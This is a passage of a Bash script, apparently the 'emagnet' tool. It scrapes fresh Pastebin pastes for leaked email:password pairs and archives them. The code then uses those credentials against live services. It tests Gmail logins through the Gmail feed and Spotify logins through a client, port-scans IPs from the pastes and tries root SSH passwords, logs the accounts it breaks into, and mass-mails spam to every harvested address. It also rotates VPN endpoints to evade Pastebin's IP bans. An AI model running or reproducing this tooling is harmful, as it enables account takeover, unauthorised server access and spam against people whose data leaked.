   sweden1)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-got.ovpn  &> /dev/null & ;;
   sweden2)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-hel.ovpn  &> /dev/null & ;;
   sweden3)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-mma.ovpn  &> /dev/null & ;;
   sweden4)        cd $VPNPROVIDER;openvpn --config $VPNCONFIG.se-sto.ovpn  &> /dev/null & ;;
   united-states)  cd $VPNPROVIDER;openvpn --config $VPNCONFIG.us.ovpn      &> /dev/null & ;;
esac
}

banned() {
if [[ $VPN = "false" ]]; then
   Iwasbanned
else

line='...........................................................'
line1='................................[ ok ]'
line2='...............................................'
OPENVPNRUNNING="$(ps aux |grep openvpn|sed '1d')"
MYIP="$(curl -s https://nr1.nu/i/)"
MYCOUNTRY="$(curl -s https://nr1.nu/i/|xargs whois|grep -i COUNTRY|awk '{print tolower($2)}')"
COUNTRY=$(awk -F'="' '/VPNCOUNTRYS="/ {print $2}' /etc/emagnet.conf|sed 's/"//g'|tr ' ' '\n'|shuf -n1)

curl -s $WIP > /tmp/.emagnet-ip
if [[ -n $OPENVPNRUNNING ]]; then 
  pkill -9 openvpn
fi

printf "\e[1;31m                You have been blocked by pastebin...\n\n\e[0m"
printf "%s${line2:${#MYIP}}[ ok ]\n" "Current IP: $MYIP"
printf "Connecting to "
printf "\e[1m%s\e[0m%s \e[1;37m%s\e[0m" $COUNTRY ", please wait${line1:${#COUNTRY}}"
printf "\n"
       vpnsetup
       sleep 10
MYIP="$(curl -s https://nr1.nu/i/)"
MYOLDIP="$(cat /tmp/.emagnet-ip)"
    if [[ $MYIP != "$MYOLDIP" ]]; then
         MYNEWIP=$(printf "Successfully connected to $(echo  "$(curl -s https://nr1.nu/i/)")")
         printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
         printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
         sleep 5
    fi

     if [[ $MYIP = "$MYOLDIP" ]]; then
         echo -e "Still trying to establish a connection.....................[\e[1;3m\e[5mwait\e[0m\e[0m]"
         sleep 10
          if [[ ! $MYIP = "$MYOLDIP" ]]; then
             MYNEWIP=$(echo -e "Successfully connected to $(curl -s https://nr1.nu/i/)")
             printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
             printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
             sleep 5
          else
             echo -e "It seems to be some trouble with the connection, aborted...[\e[1;31mfail\e[0m]\n"
             exit 1
          fi
     fi
fi
}

safety() {
if [[ -z $MYIP ]]; then
    myyyyip="$(curl -s $WIP | sed -n '121p')"
    sed -i '40d' /etc/emagnet.conf
    sed -i "40i MYIP=" /etc/emagnet.conf
    sed -i "s/MYIP=/MYIP=$myyyyip/g" /etc/emagnet.conf
    echo "\[$(date +%d/%m/%Y\ -\ %H:%M)\]: $(whoami) - Aborted for safety, don't use your own IP!!" >> $EMAGNETLOGS/emagnet.log
fi
}

analyz() {
clear
banner
    printf "%26s"
    printf A
      sleep 0.1
    printf n
      sleep 0.1
    printf a
      sleep 0.1
    printf l
      sleep 0.1
    printf y
      sleep 0.1
    printf z
      sleep 0.1
    printf i
      sleep 0.1
    printf n
      sleep 0.1
    printf g
      sleep 0.1
    printf .
      sleep 0.1
    printf . 
      sleep 0.1
    printf .
      sleep 0.1
    printf "."
      sleep 0.1
    printf "\n\n"
}
     
analyzer() {
wait_time=$TIME
temp_cnt=${wait_time}
while [[ ${temp_cnt} -gt 0 ]]; do
    printf "\r         I'll Will Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
    sleep 1
((temp_cnt--))
done
}

countdown() {
if [[ $GBRUTEFORCE = "true" ]]; then
    clear
    banner
      printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
      printf "\n%64s \n" | tr ' ' '='
      echo
    analyzer
elif [[ $PBRUTEFORCE = "true" ]]; then
    clear
    banner
      printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
      printf "\n%64s \n" | tr ' ' '='
      echo
    analyzer
elif [[ $SBRUTEFORCE = "true" ]]; then
    clear
    banner
      printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
      printf "\n%64s \n" | tr ' ' '='
      echo
      analyzer
else sed -i '118d' $CONF; sed -i '118 i GBRUTEFORCE=false' $CONF
	 sed -i '119d' $CONF
         sed -i '119 i SBRUTEFORCE=false' $CONF
	 conf
         analyzer
fi
}

blocked() { conf;if [[ ! -s /tmp/.emagnet ]]; then $BROWSER -dump $PASTEBIN > /tmp/.emagnet;fi; }

stats() {
if ! [[ -d $EMAGNETARCHIVE/all-files ]]; then
    clear;banner
    echo -e "[\e[0;31m<<\e[0m] - Duh! You must run emagnet before you can count any stats.\n"
    exit 1
fi
         echo
    clear
    banner
         printf "[\e[1;32m>>\e[0m] - Please wait, counting data"
         printf "%s" "                           (00%)"
           sleep 1
         TOTALFILES=$(ls $EMAGNETARCHIVE/all-files | wc -l)
    clear
    banner
         printf "[\e[1;32m>>\e[0m] - Please wait, counting total files.."
         printf "%s" "..                (14%)"
           sleep 0.5
         TEMAILFILES=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETARCHIVE/all-files | cut -d: -f1|uniq|sort| wc -l)
    clear
    banner
         printf "[\e[1;32m>>\e[0m] - Please wait, counting email files.."
         printf "%s" "....              (39%)"
           sleep 0.5
         TPASSWORDFILES=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'\|'>'|uniq|sort|wc -l)
    clear
    banner
         printf "[\e[1;32m>>\e[0m] - Please wait, counting password files.."
         printf "%s" "......         (51%)"
           sleep 0.5
         TEMAILS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|wc -l)
    clear
    banner
         printf "[\e[1;32m>>\e[0m] - Please wait, counting total email addresses"
         printf "%s" "........  (92%)"
           sleep 0.5
         TPASSWORDS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ' '\|'/'\|'"'\|','\|'<'\|'>'|wc -l)
    clear
    banner
         printf "[\e[1;32m>>\e[0m] - Please wait, counting total passwords.."
         printf "%s\n" ".............(100%)"
           sleep 0.5
    clear
    banner
         if ! [[ $TOTALFILES = "0" ]]; then
              printf '[\e[1;32m>>\e[0m] - Done, calculating stats'
              printf "%s\n\n" ".............................(100%)"
              sleep 2
        fi
    clear
    banner

line='      -'
for totalfiles in $TOTALFILES; do    
  if [[ $TOTALFILES -lt "10" ]]; then
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Total files downloaded\n" 0$TOTALFILES "${line:${#TOTALFILES}}"
  else
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Total files downloaded\n" $TOTALFILES "${line:${#TOTALFILES}}"
  fi
done

for temails in $TEMAILS; do
  if [[ $TEMAILS -lt "10" ]]; then
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Mail addresses stored\n" 0$TEMAILS "${line:${#TEMAILS}}"
  else
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Mail addresses stored\n" $TEMAILS "${line:${#TEMAILS}}"
  fi
done

for tpasswords in $TPASSWORDS; do
  if [[ $TPASSWORDS -lt "10" ]]; then
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Passwords stored\n" 0$TPASSWORDS "${line:${#TPASSWORDS}}"
  else
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Passwords stored\n" $TPASSWORDS "${line:${#TPASSWORDS}}"
  fi
done

for temailfiles in $TEMAILFILES; do
  if [[ $TEMAILFILES -lt "10" ]]; then
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Files with at least one email address\n" 0$TEMAILFILES "${line:${#TEMAILFILES}}"
  else
     printf "%11s"
     printf "[\e[1;32m%s\e[m] %s Files with at least one email address\n" $TEMAILFILES "${line:${#TEMAILFILES}}"
  fi
done

for tpasswordsfiles in $TPASSWORDFILES; do
  if [[ $TPASSWORDFILES -lt "10" ]]; then
     printf "%11s[\e[1;32m%s\e[m] %s Files with at least one password\nn" 0$TPASSWORDFILES "${line:${#TPASSWORDFILES}}"
  else
     printf "%11s"; printf "[\e[1;32m%s\e[m] %s Files with at least one password\n" $TPASSWORDFILES "${line:${#TPASSWORDFILES}}"
  fi
done
     printf "\n%64s \n\n" | tr ' ' '='
}

spotifybruter() {
VERSION="0.6.0"
WWWSOURCE="https://nr1.nu/archive/sconsify"
SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
SPOTIFY_TARGETS="/tmp/.emagnet-passwords"

hash sconsify &> /dev/null
if [[ $? -ne "0" ]]; then
 if [[ ! -f "./sconsify" ]]; then
   echo "Sconsify is required to be installed.."
 fi

   read -p "Download and install scosnify (y/N): " installsconsify
         if [[ $installsconsify -eq "y" ]]; then
                wget -q "${WWWSOURCE/linux-x86_64-sconsify-${VERSION}.next.zip}"
                unzip -o "linux-x86_64-sconsify-${VERSION}.next.zip"
                echo "Done.."
                       if [[ -d /usr/local/bin ]]; then
                                  mv "sconsify" "/usr/local/bin"
                                  chmod +x "/usr/local/bin"
                       fi
        fi
fi

grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP \
|awk '{print $1}' \
|cut -d: -f2,3 \
|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> /tmp/.emagnet-passwords.txt

while read line; do
SPOTIFY_USER="$(echo $line|cut -d: -f1)"
SPOTIFY_PASS="$(echo $line|cut -d: -f2)"

     ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
          if [[ "$?" -eq "0" ]]; then
             echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
          else
              echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
              echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
              echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"  >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
              echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
              echo -e "[+] Username: ${SPOTIFY_USER}"                                        >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
              echo -e "[+] Password: ${SPOTIFY_PASS}"                                        >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
              echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
          fi

done < /tmp/.emagnet-passwords.txt
}

sshbruter() {
if [[ -z $SSHPASS ]]; then
   echo -e "You must set a password to use during the attack"
   read -p "Enter a password or hit enter for default (Default: root) " sshpassb
   echo ""
     if [[ -n $sshpassb ]]; then
       sed -i '170d' $CONF
       sed -i "170 i SSHPASS=$sshpassb" $CONF
     else
       sed -i '170d' $CONF
       sed -i "170 i SSHPASS=root" $CONF
     fi
fi

SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.*\|^11.*"
grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNETHOME/.temp\
|awk -F':' '{print $2}'\
|sort\
|grep -v $SKIPLIST\
|awk -F, '!seen[$1]++'> $SSHPORTSCAN
if [[ $(cat /tmp/.emagnet-portscan|wc -l) -eq "0" ]]; then
    printf "%17s[\e[1;31m\e[5m00\e[0m\e[0m] - Ipv4 Addresses found\n"
    sleep 2
else
    clear
    banner
      echo -e "                  PORTSCANNING - BRUTEFORCING"
      printf "\n%64s" | tr ' ' '='
      printf "\nPort/Brute attack will be started within 2 seconds..............\n"
      printf "Please use (CTRL+C) to abort the scan at anytime................\n"
      printf "%64s\n" | tr ' ' '='
    sleep 2
parallel -j$THREADS -a /tmp/.emagnet-portscan '\
timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee /tmp/.emagnet-sshbruter.txt 2>&1 grep open && \
timeout 1 sshpass -p "$SSHPASS" ssh -v "-o StrictHostKeyChecking=no" $SSHUSER@{} pwd 2>&1 grep "Authenticated to" &> /dev/null

if [[ $? -eq "0" ]]; then
    echo -e "[\e[1;32m>>\e[0m] - Found password: root@{}"
    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+] Login Details For SSH - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+] Username: $SSHUSER"                                               >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "[+] Password: $SSHPASS"                                               >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
lse
    echo -e "[\e[1;31m<<\e[0m] - Wrong password: root@{}"
    echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS access on: {}:22" >> $EMAGNETLOGS/failed-2-crack.txt
fi
#echo -e "[\e[1;32mopen..\e[0m] - {}:22" || \
#echo -e "[\e[1;31mclosed\e[0m] - {}:22"' 
fi
    rm "$SSHPORTSCAN" "$SSHTARGETS" "grep" "open" &> /dev/null
    sleep 4
}

bruter() {
if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> /tmp/.emagnet-passwords.txt 

while read -r line; do
attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
mail="$(echo $line | cut -d: -f1)"
password="$(echo $line | cut -d: -f2)"
if [[ -z "$attack" ]]; then
    printf "[-] Wrong Password For $mail: \e[1;31m$password\e[0m\n"
    echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> $EMAGNETLOGS/failed-to-crack.txt
fi
if [[ -n "$attack" ]]; then
    echo -e  "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
    read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
    echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+]------------------------------------------------------------"      >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Username: $mail"                                                  >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "[+] Password: $password"                                              >>    $EMAGNETLOGS/cracked-passwords.txt
    echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-passwords.txt
fi
done < /tmp/.emagnet-passwords.txt
    rm /tmp/.emagnet-passwords.txt
    sleep 3
else
    sleep 1
fi
}

emagnetsyntax() {
$BROWSER -dump $PASTEBIN/bash|grep -q "blocked your IP"
if [[ $? = "0" ]]; then
 if [[ $VPN = "true" ]]; then
      banned
 else
      echo -e "[\e[1;31m<<\e[0m] - You have been blocked by pastebin"
      echo -e "[\e[1;31m<<\e[0m] - Enable a vpn or please try again later, aborted\n"
      exit 1
 fi
fi

if [[ $BROWSER = "lynx" ]]; then
      lynx -dump https://pastebin.com/languages|grep archive|sed '$d'|cut -c 7-|sed '1d'|cut -d'/' -f5|xargs -L3|column -t > /tmp/.emagnet-syntaxes
 elif [[ $BROWSER = "elinks" ]]; then
      elinks -dump https://pastebin.com/languages|grep archive|sed '$d'|cut -c 7-|sed '1d'|cut -d'/' -f5|xargs -L3|column -t > /tmp/.emagnet-syntaxes
 else
      choosebrowser
 fi

read -p "Syntax (ex: python): " SYNTAX2DL

if [[ -z $SYNTAX2DL ]]; then
      echo -e "[\e[1;31m\e[1m<<\e[0m\e[0m] - Duh! You must choose a syntax language to download, aborted.."
      exit 1
fi

if [[ $BROWSER = "elinks" ]]; then
      elinks -dump $PASTEBIN/$SYNTAX2DL|grep https|cut -c 6-|sed 's/com/com\/raw/g'|awk 'length($0)>31 && length($0)<35'|grep -v 'messages\|settings\|archive\|contact\|pastebin$\|languages' > /tmp/.emagnet-syntaxes-urls
elif [[ $BROWSER = "lynx" ]]; then
      lynx -dump $PASTEBIN/$SYNTAX2DL |grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>31 && length($0)<35'|grep -v 'language\|night_mode\|messages\|settings\|pastebin$\|archive\|contact'  > /tmp/.emagnet-syntaxes-urls
else
      choosebrowser
fi

grep -q "$SYNTAX2DL" /tmp/.emagnet-syntaxes
if [[ $? = "0" ]]; then
     printf "Downloading $(cat /tmp/.emagnet-syntaxes-urls|wc -l) $SYNTAX2DL files.."
     mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
     parallel -j $THREADS wget -nc -q -P "$EMAGNETSYNTAX/$SYNTAX2DL" {} < /tmp/.emagnet-syntaxes-urls &> /dev/null
     printf "\nDone.\n\n" | tr ' ' '.'
     rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
else
      echo -e "\n[\e[1;31m\e[1m<<\e[0m\e[0m] - Duh! That's \e[4mnot\e[0m a valid syntax language..\n"
      exit 1
      rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
fi
}

moveem() {
clear
banner
     createbdirs() {
          if [[ ! -d $EMAGNETARCHIVE/emagnet ]]; then
              mkdir -p $EMAGNETARCHIVE/{all-files,email-files,password-files,logs}
          fi
}


copy_files() {
paths
AEXIST="$(echo $(ls /opt/emagnet/incoming/*/all-files/|wc -l))" 
EEXIST="$(echo $(ls /opt/emagnet/incoming/*/all-files/|wc -l))" 
PEXIST="$(echo $(ls /opt/emagnet/incoming/*/all-files/|wc -l))"

if [[ $AEXIST -gt "0" ]]; then
      echo -n "Copying 'all-files' into 'archive/all-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
      cp -rn $EMAGNET/incoming/*/all-files/*  $EMAGNETARCHIVE/all-files &> /dev/null
else
      echo -n "Copying 'all-files' into 'archive/all-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

if [[ $EEXIST -gt "0" ]]; then
      echo -n "Copying 'email-files' into 'archive/email-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
      cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files &> /dev/null
else 
      echo -n "Copying 'email-files' info 'archive/email-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

if [[ $PEXIST -gt "0" ]]; then
      echo -n "Copying 'password-files' into 'archive/password-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]\n"
      cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files &> /dev/null
else
      echo -n "Copying 'password-files' into 'archive/password-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]\n"
fi
}

merge_logs() {
paths
YEAR=$(echo $(date +%Y))
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/emagnet.log; done
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/emails-from-pastebin.txt; done
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/passwords-from-pastebin.txt; done
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/pastebin-urls.txt; done

if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/emagnet.log|wc -l) -gt "0" ]]; then
    echo -n "Merging 'emagnet.log' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    awk -F, '!seen[$1]++' $EMAGNET/incoming/*/logs/emagnet.log  >> $EMAGNETARCHIVE/logs/emagnet.log &> /dev/null
else
    echo -n "Merging 'emagnet.log' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/emails-from-pastebin.txt|wc -l) -gt "0" ]]; then
 if [[ ! -f $EMAGNET/incoming/$YEAR-*-*/logs/emails-from-pastebin.txt ]]; then touch $EMAGNET/incoming/*/logs/emails-from-pastebin.txt; fi
    echo -n "Merging 'emails-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    awk -F, '!seen[$1]++'  $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|tr ' ' '\n'|awk -F, '!seen[$1]++' $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|tr ' ' '\n' >> $EMAGNETARCHIVE/logs/emails-from-pastebin.txt  2> /dev/null 
 else
    echo -n "Merging 'emails-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
 fi

if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/passwords-from-pastebin.txt|wc -l) -gt "0" ]]; then
 if [[ ! -f $EMAGNET/incoming/$YEAR-*-*/logs/passwords-from-pastebin.txt ]]; then touch $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt; fi
    echo -n "Merging 'passwords-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    awk -F, '!seen[$1]++' $EMAGNET/incoming/$YEAR-*-*/passwords-from-pastebin.txt >> $EMAGNETARCHIVE/logs/passwords-from-pastebin.txt  2> /dev/null
 else
  echo -n "Merging 'passwords-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/pastebin-urls.txt|wc -l) -gt "0" ]]; then
    echo -n "Merging 'pastebin-urls.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
if [[ $INCLUDETIME = "true" ]]; then
    cat $EMAGNET/incoming/*/logs/pastebin-urls.txt >> $EMAGNETARCHIVE/logs/pastebin-urls.txt  2> /dev/null
else 
    grep "https" $EMAGNET/incoming/*/logs/pastebin-urls.txt |>> $EMAGNETARCHIVE/logs/pastebin-urls.txt  2> /dev/null
fi
else
    echo -n "Merging 'pastebin-urls.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi
printf "\nAll data has been successfully merged into archive/logs\n\n"
read -p "Do you want to wipe incoming directories (y/n): " cleanup
if [[ $cleanup = "y" ]]; then
    rm -rf $EMAGNET/incoming/
    printf "\nSuccessfully \e[1;31mwiped\e[0m incoming directories..\n\n"
else
    printf "\nAborted.\n\n"
fi
}
createbdirs
copy_files
merge_logs
}

emagnetspammer() {
clear;banner
ssmtp &> /dev/null
if [[ $? -gt "0" ]]; then
    printf "[\e[1;31m<<\e[0m] - Spammer require ssmtp to be installed and configured.\n\n"
    exit 1
fi

if [[ -z $EMAIL2SEND ]]; then
    printf "[\e[1;31m<<\e[0m] - You must create a text file with the text you want to send\n"
    printf "[\e[1;31m<<\e[0m] - to all targets, when text file has been created then you must\n"
    printf "[\e[1;31m<<\e[0m] - set text file in /etc/emagnet.conf under EMAIL2SEND=/path/textfile\n\n"
    exit 1
fi

if [[ ! -f $EMAIL2SEND ]]; then
    printf "Can't find $EMAIL2SEND, aborted..\n\n"
    exit 1
fi

if [[ $(ls $EMAGNETDB|wc -l) -eq "0" ]]; then
    echo -e "[\e[0;33m<<\e[0m] - No email addresses has been found today.."
    echo -e "[\e[0;33m<<\e[0m] - Let's run emagnet by hit [enter] or hit any other for stop.."
    read  -s -n 1 key
    if [[ -z $key ]]; then
        bash emagnet --emagnet 
    else
        echo -e "[\e[1;31m<<\e[0m] - Let's spam some email addresses another day, aborted. :-(\n";exit 1; fi
    exit 1
else
NRTARGETS="$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2|wc -l)"
  printf "%24s \e[1;31mTargets: \e[1;32m$NRTARGETS\e[0m\e[0m\n\n"
  read -p "- Do you want to send an email to all targets (yes/NO): " sendtoall
    case $sendtoall in
    yes) printf "%62s \n" | tr ' ' '='
        grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > /tmp/.emagnet-spammer
           while read e1; do printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]" | tr ' ' '.' 
           done < /tmp/.emagnet-spammer
        rm /tmp/.emagnet-spammer &> /dev/null ;;
       *) echo -e "- Aborted..\n";exit 1 ;;
    esac
fi
}

emagnet2() {
if [[ $BROWSER = "elinks" ]]; then
elinks -dump $PASTEBIN | \
grep https |\
cut -c 6- |\
sed 's/com/com\/raw/g' |\
awk 'length($0)>31 && length($0)<35' |\
grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping\|contact\|pastebin$\|settings' > /tmp/.emagnet1

ls -1 $EMAGNETALL |sort > 1
cat /tmp/.emagnet1|sort |cut -d/ -f5 > 2
grep  -v -x -F -f 1 2  | awk -F, '!seen[$1]++'|sed "s/^/https:\/\/pastebin.com\/raw\//g" > /tmp/.emagnet
rm 1 2 &> /dev/null

else

lynx -dump $PASTEBIN \
|grep https \
|cut -c 6- \
|sed 's/com/com\/raw/g' \
|awk 'length($0)>31 && length($0)<35' \
|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping\|contact\|pastebin$\|settings\|signup\|raw\/$\|alerts' > /tmp/.emagnet1
  ls -1 $EMAGNETALL |sort > 1
  cat /tmp/.emagnet1|sort |cut -d/ -f5 > 2
  grep -v -x  -F -f 1 2 | awk -F, '!seen[$1]++'|sed "s/^/https:\/\/pastebin.com\/raw\//g" > /tmp/.emagnet
  rm 1 2 &> /dev/null
fi

if [[ $(cat /tmp/.emagnet1|wc -l) = "8" ]]; then
   clear
   banner
   echo -e "                            \e[1;31mNOTICE\e[0m:\n"
   echo -e "[\e[1;31m<<\e[0m] - You are scraping pastbin.com way too fast! \e[1;31mSlow Down\e[0m!"
   echo -e "[\e[1;31m<<\e[0m] - Pastebin has blocked you from the archive page until you slow down."
   echo -e "[\e[1;31m<<\e[0m] - You will only be able to download 8 files at time until you raise TIME"
   echo -e "[\e[1;31m<<\e[0m] - The block from pastebin.com/archive will be lifted within 20 minutes.."
   sleep 7
   clear
   banner
fi

if [[ $(cat /tmp/.emagnet1|grep https) = "0" ]]; then 
  heavyload
  Iwasbanned
fi

parallel -j200% -n8 -a /tmp/.emagnet wget -nc -P $EMAGNETTEMP &> /dev/null
tt="$(ls $EMAGNETTEMP | wc -l)";if [[ $tt -lt "10" ]]; then 
  tt="0$tt"
fi

if [[ $tt = "00" ]]; then  $
  BROWSER -dump $PASTEBIN|grep -q "blocked"
    if [[ $? = "0" ]]; then 
      Iwasbanned;
    fi

printf "[\e[1;31m<<\e[0m] - No files has been downloaded, you may wanna rise time?\n\n";tt="\e[1;31m\e[5m00\e[0m";sleep 5
     clear
     banner
else 
     echo -e "\nURLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n=================================" >> $EMAGNETLOGS/pastebin-urls.txt
     cat /tmp/.emagnet >> $EMAGNETLOGS/pastebin-urls.txt
fi

i=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'  $EMAGNETTEMP|cut -d: -f1|tr ' ' '\n')
il=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|cut -d: -f2|tr ' ' '\n')
it=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP|wc -l|tr ' ' '\n')
